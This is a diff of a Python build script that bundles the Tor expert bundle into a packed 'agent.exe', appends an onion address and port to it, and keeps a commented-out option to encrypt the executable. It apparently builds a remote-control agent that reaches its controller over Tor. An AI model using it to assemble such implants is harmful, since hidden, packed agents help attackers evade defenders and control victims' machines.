@@ -5,22 +5,23 @@ import zipfile
 import sys
 from argparse import ArgumentParser
 
-#run this to build the agent.exe output all the configurations are taken care by this code
-
+# from string import (
+#     ascii_lowercase,
+#     ascii_uppercase,
+#     digits
+# )
 
 #This command works well and produces out without error
 # PyInstaller --debug all --onefile --add-data=torbundle:torbundle --upx-dir=upx-3.96-win64 agent.py 
 
 def get_tor_expert_bundle():
-    # create directory for the tor expert bundle
+
     os.mkdir('torbundle')
     os.chdir('torbundle')
 
-    # download tor expert bundle
     tor_url = 'https://archive.torproject.org/tor-package-archive/torbrowser/10.5.6/tor-win32-0.4.5.10.zip'
     file_data = requests.get(tor_url, allow_redirects=True)
 
-    # write downloaded tor expert bundle
     try:
         file = open('tor.zip', 'wb')
         file.write(file_data.content)
@@ -30,12 +31,10 @@ def get_tor_expert_bundle():
     else:
         print('[*] Wrote tor expert bundle to file')
 
-    # unzip tor expert bundle
     file = zipfile.ZipFile('tor.zip')
     file.extractall('.')
     print("[*] Unpacked Tor expert bundle")
 
-    # change directory back to \client
     os.chdir('..')
 
 
@@ -45,12 +44,11 @@ def append_address(onion, port):
     for path in ['./dist/agent.exe']:
         with open(path, 'a') as file:
             file.write(onion)
-            # add padding to always use the same amount of bytes
             if len(port) < 5:
                 rest = 5 - len(port)
                 port = rest * '0' + port
             file.write(port)
-    print('Appended onion address and port to executables')
+    print('Executable agent build completed sucessfully.')
 
 
 # def parse_args():
@@ -62,10 +60,18 @@ def append_address(onion, port):
 
 
 if __name__ == '__main__':
-    # dont download everytime
     if not os.path.isdir('torbundle') and os.name == 'nt':
         get_tor_expert_bundle()
 
+
+    #If needed to encrypt the executable:
+    # encryption_key_charset = ascii_uppercase + ascii_lowercase + digits
+    # encryption_key = ''.join(choice(encryption_key_charset) for _ in range(16))
+    # pyinstaller_args = ['agent.py', '--onefile', '--key={}'.format(encryption_key)]
+    # pyinstaller_args_windows = ['--add-data=torbundle;torbundle', '--upx-dir=upx-3.96-win64']
+    # pyinstaller_args_linux = ['--add-data=tor_linux:tor_linux', '--upx-dir=upx-3.96-amd64_linux/']
+    
+    
     # if os.name == 'nt':
     PyInstaller.__main__.run([
         'agent.py',
